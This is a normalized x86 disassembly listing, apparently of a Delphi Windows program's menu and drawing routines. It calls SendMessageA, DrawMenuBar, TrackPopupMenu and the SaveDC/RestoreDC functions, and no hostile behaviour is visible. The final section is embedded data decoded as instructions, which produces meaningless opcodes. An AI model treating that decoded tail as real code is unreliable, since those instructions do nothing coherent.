mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408a50
mov eax [ ebp + 0x10 ]
call sub_408968
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_469bc0
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_4528d8
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_469b9c
mov [ ebx + 0x41 ] 0x1
sub_469be8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_469b9c
mov [ ebx + 0x41 ] 0x1
sub_469c74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_469770
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_4695f8
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_469d04
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_469d40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_465cac
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_469d8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_469820
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_469d40
call sub_4656e8
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_469de8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469e12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469e34
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a367
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a36e
lea eax [ ebp - 0x30 ]
call sub_403f7c
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edx [ esi + 0x4 ]
call sub_469138
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4761f8
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov dx [ esi + 0x4 ]
call sub_46911c
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_46a19a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46a17d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_4257b8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_425658
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_46a60c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a184
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4257b8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_46997c
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_46907c
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_46907c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_46a2dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_46a2b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46a29b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_4257b8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_425658
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a2a2
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4257b8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_452b5c
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4761f8
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_46907c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_46907c
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_46907c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_4690ac
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418dc4
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_4690ac
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_475e9c
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_475f04
jmp r-xdata
sub_46a2bf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_46a378
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418c68
pop esi
pop ebx
retn
push ebx
push sub_469de8
call sub_422438
mov [ ebx + 0x10 ] eax
sub_46a3bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_468e94
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_46a378
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_46a430
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_46a3a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_468f30
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_46a488
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_46522c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_469b9c
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_469b9c
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_46a4d0
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_46522c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_474a48
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_4033e8
mov edx eax
jmp r-xdata
sub_46a51c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_417744
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_46a488
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4687e8
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_468ce4
mov eax [ ebx + 0x34 ]
call sub_46608c
mov eax ebx
call sub_46968c
mov eax ebx
call sub_46a4d0
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_4661bc
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46a5d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418dc4
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418dc4
cmp ebp [ eax ]
jne r-xdata
sub_46a60c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424f74
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_4247a8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_424f74
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_4247a8
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4033e8
mov edx [ r-xdata ]
call sub_403378
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424f74
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_4247a8
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_46a6f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403fd0
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40423c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044dc
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40423c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044dc
jmp r-xdata
sub_46a788
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f7c
mov ebx 0x1
mov eax esi
call sub_40423c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404164
sub_46a7ec
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a845
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46a6f4
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46a6f4
mov eax [ ebp - 0x8 ]
pop edx
call sub_408084
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a84c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
sub_46a8c6
dec eax
add [ eax - 0xbffb7f2 ] bl
lea ecx [ eax ]
xchg esp eax
push cs
dec eax
add al bl
mov cl [ eax ]
nop
push cs
dec eax
add al ch
mov cl [ eax ]
mov [ esi ] cs
dec eax
add [ eax ] ch
mov ecx [ eax ]
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46a94c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a953
retn
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
call sub_4031ec
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a04
mov eax rw-data
call sub_403f7c
sub_46a958
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d28
mov eax [ r-xdata ]
call sub_4183f8
mov eax [ r-xdata ]
call sub_418498
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
mov eax [ r-xdata ]
call sub_41833c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c474
mov [ rw-data ] eax
sub_46ac11
aad 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
or dh dl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
inc esi
add [ eax ] cl
ja r-xdata
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
into
inc ebp
dec esi
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bh
fadd [ esi ]
push esp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + ebp * 4 + 0x77080046 ] dl
jae r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
add [ esi + ecx * 8 + 0x45 ] dl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
pop ss
outsd
jb r-xdata
rcl [ ebp + eax * 2 + 0x46d94800 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax + 0x580046d9 ] ch
fadd [ esi ]
mov esi ds
inc esi
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
call [ eax + 0x6c0046de ]
fild [ esi ]
nop
fild [ esi ]
and al 0xe0
inc esi
add [ eax - 0x22 ] ch
inc esi
add al cl
fld [ esi ]
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebp + ebx * 4 + 0x45 ] bl
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
sbb al 0x4f
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
push esi
jb r-xdata
outsd
insb
nop
cmp al 0xae
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax + ebx * 8 - 0x3697ffba ] al
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
inc edx
jae r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
sub [ ebp + 0x1b8c0046 ] ch
inc ebp
add [ 0x6f460500 ] cl
jb r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
pop eax
salc
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x30046ac ] bl
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc ebp
add [ edx + ebx + 0x42 ] bl
shr [ eax ] 0xad
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
lodsd [ esi ]
inc esi
add [ edx ] ah
scasb [ edi ]
inc esi
add [ edx + eax ] bl
add [ eax ] al
fcom [ edi ]
shl ecx 0x2
jb r-xdata
fild [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
scasb [ edi ]
inc esi
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
add [ 0xffffffffb4000000 ] al
jae r-xdata
add [ ebx ] al
add [ eax ] al
add al bh
scasd [ edi ]
inc esi
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
insb
inc esi
je r-xdata
inc esi
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
scasb [ edi ]
stosb [ edi ]
inc esi
add [ edx + eax ] cl
add bh bh
push eax
fild [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
or eax 0x74726556
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ebp * 4 + 0x46050046 ] dh
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
dec eax
scasd [ edi ]
insb
add [ gs : eax ] eax
add [ eax ] al
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
stosb [ edi ]
inc esi
add [ eax ] cl
add al [ eax ]
inc [ eax - 0x25 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ edx + ebp * 4 + 0x2080046 ] ch
add bh bh
inc eax
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x5053ffc0 ]
add bh bh
insd
xchg esp eax
adc [ eax ] eax
add ecx eax
loope r-xdata
inc esi
add [ ebx ] al
lea eax [ eax ]
lodsb [ esi ]
scasd [ edi ]
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
